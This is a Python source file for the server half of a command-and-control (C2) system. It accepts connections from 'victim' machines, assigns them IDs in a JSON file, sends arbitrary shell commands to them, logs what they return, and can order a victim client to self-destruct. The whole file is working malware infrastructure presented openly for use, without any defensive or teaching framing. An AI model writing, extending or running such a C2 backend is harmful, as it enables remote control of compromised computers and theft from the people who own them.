# c2_server_logic.py
import socket
import threading
import time
import os
import json

LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# The JSON file that holds machine->ID assignments
JSON_PATH = "clients.json"

lock = threading.Lock()
connected_clients = {}  # { client_id: { "conn", "addr", "userinfo" } }
client_locks = {}       # { client_id: threading.Lock() }
client_responses = {}   # If storing in-memory responses
shell_state = {}
# We won't keep a local "client_counter" because we'll rely on the JSON file to track "last_id"

def load_client_map():
    """
    Load the JSON that tracks machine->client_id, and the 'last_id' so we know which ID to use next.
    """
    if not os.path.isfile(JSON_PATH):
        return {
            "machine_to_id": {},
            "last_id": 0
        }
    with open(JSON_PATH, "r", encoding="utf-8") as f:
        data = json.load(f)
    # Ensure the keys exist
    if "machine_to_id" not in data:
        data["machine_to_id"] = {}
    if "last_id" not in data:
        data["last_id"] = 0
    return data

def save_client_map(data):
    """Write the updated machine->ID map to the JSON file."""
    with open(JSON_PATH, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

def get_connected_clients():
    """
    Returns a list of dicts: each {client_id, addr, userinfo}.
    Used by app.py to display on index.html.
    """
    snapshot = []
    with lock:
        for cid, data in connected_clients.items():
            snapshot.append({
                "client_id": cid,
                "addr": data["addr"],
                "userinfo": data["userinfo"],
                "shell_active": shell_state.get(cid, False)
            })
    return snapshot

def add_new_connection(conn, addr):
    """
    1. Receive machine name from victim.
    2. Look up / assign a numeric ID in clients.json.
    3. Store the connection in connected_clients, spawn client_receiver thread.
    """
    try:
        machine_name = conn.recv(1024).decode(errors="ignore").strip()
    except:
        machine_name = "unknown_machine"

    # Load the current machine->ID map from JSON
    data = load_client_map()
    machine_to_id = data["machine_to_id"]
    last_id = data["last_id"]

    # If machine_name is new, assign next ID
    if machine_name in machine_to_id:
        client_id = machine_to_id[machine_name]
    else:
        client_id = last_id + 1
        machine_to_id[machine_name] = client_id
        data["last_id"] = client_id

    # Save the updated map
    save_client_map(data)

    # Now store the connection in memory
    with lock:
        connected_clients[client_id] = {
            "conn": conn,
            "addr": addr,
            "userinfo": machine_name
        }
        client_locks[client_id] = threading.Lock()
        client_responses[client_id] = {}

    print(f"[+] New victim '{machine_name}' assigned ID {client_id}, from {addr}")

    threading.Thread(target=client_receiver, args=(client_id, conn), daemon=True).start()

def client_receiver(client_id, conn):
    """
    Continuously reads data from this client's socket and appends to logs/client_<client_id>.log.
    """
    log_path = os.path.join(LOG_DIR, f"client_{client_id}.log")
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                print(f"[-] Client {client_id} disconnected")
                break
            decoded = data.decode(errors="ignore")
            print(f"[>] Received from client {client_id}: {decoded}")

            # Append to the client's log file
            with client_locks[client_id]:
                with open(log_path, "a", encoding="utf-8") as f:
                    f.write(decoded)
            
            # If you want in-memory logs:
            # with lock:
            #     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            #     client_responses[client_id][timestamp] = decoded

        except Exception as e:
            print(f"[!] Error reading from client {client_id}: {e}")
            break

    # Remove from memory
    with lock:
        connected_clients.pop(client_id, None)
        client_locks.pop(client_id, None)
        client_responses.pop(client_id, None)
    print(f"[!] Removed client {client_id} from tracking.")

def send_message(client_id, command):
    """
    Send a command to the given client. Used by /send_command route.
    """
    with lock:
        if client_id not in connected_clients:
            return f"Client {client_id} not found."
        conn = connected_clients[client_id]["conn"]
        shell_state[client_id] = True

    if not command.endswith("\n"):
        command += "\n"
    try:
        conn.sendall(command.encode("utf-8", errors="ignore"))
        return f"Sent command to client {client_id}: {command.strip()}"
    except Exception as e:
        return f"Failed sending command to client {client_id}: {e}"

def clear_log_file(client_id):
    """
    Clears logs/client_<client_id>.log if it exists.
    """
    log_path = os.path.join(LOG_DIR, f"client_{client_id}.log")
    with lock:
        if not os.path.isfile(log_path):
            return f"No log file for client {client_id}."
        with client_locks.get(client_id, threading.Lock()):
            open(log_path, "w").close()
    return f"Cleared log for client {client_id}."

def kill_victim(client_id):
    """
    Sends a self-destruct command to close the client, forcibly closes the socket,
    and removes from memory.
    """
    with lock:
        if client_id not in connected_clients:
            return f"Client ID {client_id} not found."
        conn = connected_clients[client_id]["conn"]

    try:
        conn.sendall(b"self-destruct\n")
    except Exception as e:
        print(f"[DEBUG] Error sending self-destruct to client {client_id}: {e}")

    try:
        conn.shutdown(socket.SHUT_RDWR)
    except Exception as e:
        print(f"[DEBUG] Error shutting down connection for client {client_id}: {e}")
    conn.close()

    with lock:
        connected_clients.pop(client_id, None)
        shell_state.pop(client_id, None)
        client_locks.pop(client_id, None)
        client_responses.pop(client_id, None)
    print(f"[+] Client {client_id} forcibly removed.")
    return f"Client {client_id} removed."

def start_c2_server(host="0.0.0.0", port=4545):
    """
    Main server loop, listens for new connections, calls add_new_connection() for each.
    """
    print(f"[+] Starting C2 server on {host}:{port}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    while True:
        conn, addr = server.accept()
        add_new_connection(conn, addr)
